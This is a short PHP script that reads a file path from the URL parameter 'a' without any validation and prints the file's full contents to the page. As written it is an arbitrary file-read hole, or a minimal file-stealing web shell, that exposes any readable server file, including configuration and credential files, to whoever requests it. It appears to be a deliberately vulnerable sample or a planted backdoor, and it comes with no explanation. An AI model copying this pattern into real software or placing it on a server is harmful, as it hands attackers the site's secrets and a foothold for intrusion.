<?php
	$c=$_GET['a'];

			$target=fopen($c,'r');
			while(!feof($target)){
				echo fgets($target).'<br>';
			}
			fclose($target);
?>